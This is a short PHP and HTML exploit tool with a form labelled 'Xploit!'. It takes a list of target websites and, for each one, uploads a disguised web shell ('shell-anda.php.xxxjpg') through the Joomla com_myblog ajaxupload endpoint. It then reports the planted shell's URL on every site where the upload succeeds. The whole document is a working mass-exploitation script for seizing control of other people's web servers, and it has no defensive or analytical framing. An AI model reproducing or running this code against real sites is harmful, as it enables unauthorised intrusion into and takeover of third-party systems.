<html>
<form method="post" action="" enctype="multipart/form-data">
<textarea placeholder="http://www.target.com/" style="padding: 5px; resize: none; width: 400px; height: 200px; border: solid 1px #006400;" name="sites"></textarea><br>
<input type="submit" name="go" value="Xploit!" style="margin: 5px auto; hight: 25px; width: 200px;">
</form>
<?php
$site = explode("\r\n", $_POST['sites']);
$go = $_POST['go'];
if($go) {
foreach($site as $sites) {
$uploadfile = "shell-anda.php.xxxjpg";
$ch = curl_init("{$sites}/index.php?option=com_myblog&task=ajaxupload");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,
array('fileToUpload'=>"@$uploadfile"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
if(preg_match("/uploaded successfully|File exists|successfully uploaded|File with similar name already exist/", $postResult)) {
preg_match("/source: '(.*?)'/", $postResult, $get);
$loc = $get[1];
echo "URL : <font color=green>$sites</font><br>";
echo "Status : Successfully Xploited!<br>";
echo "File : <a href='$loc' target='_blank'><font color=green>$loc</font></a><br>";
}
}
}
?>